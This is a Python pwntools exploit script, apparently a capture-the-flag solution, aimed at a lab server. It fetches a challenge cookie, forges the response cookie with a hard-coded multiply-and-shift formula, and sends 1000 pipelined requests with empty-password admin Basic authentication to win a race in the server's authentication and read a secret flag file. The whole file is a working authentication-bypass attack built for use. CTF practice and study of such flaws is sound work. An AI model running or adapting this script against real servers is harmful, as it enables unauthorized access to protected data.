#!/usr/bin/env python3
from pwn import * # Imports remote, PwnlibException from pwntools
import re
import base64 # For encoding credentials similar to the second script's style
import sys # For exiting with status or printing to stderr if needed

# --- Configuration ---
REMOTE_SERVER_HOST = 'up.zoolab.org'
REMOTE_SERVER_PORT = 10933
TARGET_SECRET_PATH = "/secret/FLAG.txt" # The secret path we want to access

# Credentials for Basic Authentication
ADMIN_CREDENTIALS_PLAIN = b"admin:" # "admin" with an empty password
ADMIN_CREDENTIALS_B64 = base64.b64encode(ADMIN_CREDENTIALS_PLAIN).decode('utf-8')

# Constants for cookie calculation (from reverse engineering or problem description)
COOKIE_MULTIPLIER = 6364136223846793005
COOKIE_INCREMENT = 1
COOKIE_MASK_64BIT = 0xFFFFFFFFFFFFFFFF # To ensure 64-bit unsigned arithmetic
COOKIE_RIGHT_SHIFT_BITS = 33

# HTTP and Exploit Parameters
HTTP_VERSION = "HTTP/1.1"
CONNECTION_HEADER_VALUE = "keep-alive"
MAX_REQUEST_SPAM_COUNT = 1000 # How many times to send the final request in the race
FLAG_REGEX_PATTERN = r"FLAG\{[a-zA-Z0-9_!@#$%^&*()-+=.,:;?~]+\}" # Regex to find the flag

# Timeout values for network operations
HEADER_RECV_TIMEOUT_SECONDS = 5
BODY_RECV_TIMEOUT_SECONDS = 5
FINAL_RECVALL_TIMEOUT_SECONDS = 2

# Optional: Set pwntools logging level (e.g., 'debug', 'info', 'warning', 'error')
# context.log_level = 'warning'

def calculate_response_cookie_value(request_seed_value):
    """
    Calculates the 'response' cookie value based on the 'challenge' (reqseed) value.
    This logic is specific to the target server's cookie generation mechanism.
    """
    calculated_value = request_seed_value * COOKIE_MULTIPLIER + COOKIE_INCREMENT
    calculated_value &= COOKIE_MASK_64BIT  # Mask to 64 bits (simulate uint64_t overflow)
    calculated_value >>= COOKIE_RIGHT_SHIFT_BITS # Right shift
    return calculated_value

def run_exploit_attempt():
    """
    Main function to attempt the exploit.
    It connects to the server, gets a challenge cookie, calculates the response,
    and then attempts the race condition.
    """
    print(f"[*] Starting exploit attempt for server: {REMOTE_SERVER_HOST}:{REMOTE_SERVER_PORT}")
    print(f"[*] Targeting secret path: {TARGET_SECRET_PATH}")

    remote_connection = None
    try:
        remote_connection = remote(REMOTE_SERVER_HOST, REMOTE_SERVER_PORT)
        print(f"[*] Successfully connected to {REMOTE_SERVER_HOST}:{REMOTE_SERVER_PORT}")

        # Step 1: Send a preliminary request to trigger 401 Unauthorized
        # and receive the 'challenge' cookie in the Set-Cookie header.
        # We use the actual target path to ensure realpath caching might occur,
        # and trigger auth failure by not providing any auth/cookie yet.
        print(f"[*] Sending preliminary request to get challenge cookie...")
        initial_http_request_string = (
            f"GET {TARGET_SECRET_PATH} {HTTP_VERSION}\r\n"
            f"Host: {REMOTE_SERVER_HOST}\r\n"
            f"Connection: {CONNECTION_HEADER_VALUE}\r\n"
            f"\r\n"
        )
        initial_http_request_bytes = initial_http_request_string.encode()
        remote_connection.send(initial_http_request_bytes)

        initial_response_headers_bytes = b""
        try:
            # Receive headers until the double CRLF
            initial_response_headers_bytes = remote_connection.recvuntil(b"\r\n\r\n", timeout=HEADER_RECV_TIMEOUT_SECONDS)
        except PwnlibException as e:
            print(f"[-] Timeout or error receiving preliminary response headers: {e}", file=sys.stderr)
            return False # Indicate failure

        # Consume the preliminary response body if Content-Length is present,
        # to clear the buffer for the next request on the keep-alive connection.
        content_length_regex_match = re.search(b"Content-Length: (\\d+)", initial_response_headers_bytes, re.IGNORECASE)
        if content_length_regex_match:
            response_body_length = int(content_length_regex_match.group(1))
            if response_body_length > 0:
                print(f"[*] Preliminary response has Content-Length: {response_body_length}. Consuming body...")
                try:
                    remote_connection.recv(response_body_length, timeout=BODY_RECV_TIMEOUT_SECONDS) # Read and discard
                except PwnlibException as e:
                    print(f"[-] Timeout or error receiving preliminary response body: {e}", file=sys.stderr)
                    # Continue, as the headers (and cookie) might have been received correctly.

        # Parse the 'challenge' cookie value from the headers.
        challenge_cookie_regex_match = re.search(b"Set-Cookie: challenge=(\\d+);", initial_response_headers_bytes)
        if not challenge_cookie_regex_match:
            print(f"[-] Could not find 'challenge' cookie in preliminary response headers.", file=sys.stderr)
            print(f"[*] Received headers:\n{initial_response_headers_bytes.decode(errors='ignore')}")
            return False # Indicate failure

        challenge_seed_from_cookie = int(challenge_cookie_regex_match.group(1))
        print(f"[*] Successfully retrieved challenge seed: {challenge_seed_from_cookie}")

        # Calculate the required 'response' cookie value.
        calculated_target_cookie = calculate_response_cookie_value(challenge_seed_from_cookie)
        print(f"[*] Calculated target response cookie: {calculated_target_cookie}")

        # Step 2: Prepare and send the racing requests on the same keep-alive connection.
        # These requests include the 'Authorization: Basic' header with "admin:" (empty password)
        # and the calculated 'Cookie: response=...'
        print(f"[*] Preparing main request payload with Authorization and calculated Cookie.")
        main_http_request_string = (
            f"GET {TARGET_SECRET_PATH} {HTTP_VERSION}\r\n"
            f"Host: {REMOTE_SERVER_HOST}\r\n"
            f"Authorization: Basic {ADMIN_CREDENTIALS_B64}\r\n"
            f"Cookie: response={calculated_target_cookie}\r\n"
            f"Connection: {CONNECTION_HEADER_VALUE}\r\n"
            f"\r\n"
        )
        main_http_request_bytes = main_http_request_string.encode()

        print(f"[*] Sending {MAX_REQUEST_SPAM_COUNT} requests in quick succession to attempt race condition...")
        for i in range(MAX_REQUEST_SPAM_COUNT):
            remote_connection.send(main_http_request_bytes)
        print(f"[*] All {MAX_REQUEST_SPAM_COUNT} requests sent.")

        # Step 3: Receive all responses.
        print(f"[*] Attempting to receive all responses from the server...")
        all_received_data_bytes = b""
        try:
            # recvall will try to read until EOF or timeout.
            all_received_data_bytes = remote_connection.recvall(timeout=FINAL_RECVALL_TIMEOUT_SECONDS)
        except PwnlibException as e:
            # This exception is common if the server closes the connection after sending some data
            # but before recvall's internal timeout, or if it's slower than the timeout.
            print(f"[*] PwnlibException during recvall (this is often expected): {e}. Checking received data anyway.")

        if not all_received_data_bytes:
            print(f"[-] No data received in the final step after sending spam requests.", file=sys.stderr)
            return False # Indicate failure

        print(f"[*] Received {len(all_received_data_bytes)} bytes in total from spam requests.")
        full_response_string_decoded = all_received_data_bytes.decode(errors='ignore')

        # Search for the flag in the combined responses.
        print(f"[*] Searching for flag pattern: {FLAG_REGEX_PATTERN}")
        flag_regex_match = re.search(FLAG_REGEX_PATTERN, full_response_string_decoded)

        flag_successfully_found = False
        if flag_regex_match:
            print(f"[SUCCESS] FLAG FOUND: {flag_regex_match.group(0)}")
            flag_successfully_found = True
        else:
            print(f"[-] FAIL: Flag not found in the received responses.")
            # Optionally, print a snippet of the response for debugging if flag is not found
            # print(f"[*] Snippet of received data:\n{full_response_string_decoded[:500]}...")
        
        return flag_successfully_found

    except PwnlibException as e:
        print(f"[CRITICAL ERROR] A PwnlibException occurred: {e}", file=sys.stderr)
        return False
    except ConnectionRefusedError:
        print(f"[CRITICAL ERROR] Connection refused by {REMOTE_SERVER_HOST}:{REMOTE_SERVER_PORT}. Is the server running?", file=sys.stderr)
        return False
    except Exception as e:
        print(f"[CRITICAL ERROR] An unexpected error occurred: {e}", file=sys.stderr)
        return False
    finally:
        if remote_connection:
            print(f"[*] Closing connection to {REMOTE_SERVER_HOST}:{REMOTE_SERVER_PORT}.")
            remote_connection.close()

if __name__ == "__main__":
    # This main execution block mirrors the structure of the second script.
    if run_exploit_attempt():
        print("\nExploit attempt finished: FLAG potentially found and printed above.")
        sys.exit(0) # Exit with success status
    else:
        print("\nExploit attempt finished: FLAG NOT FOUND or an error occurred.")
        sys.exit(1) # Exit with failure status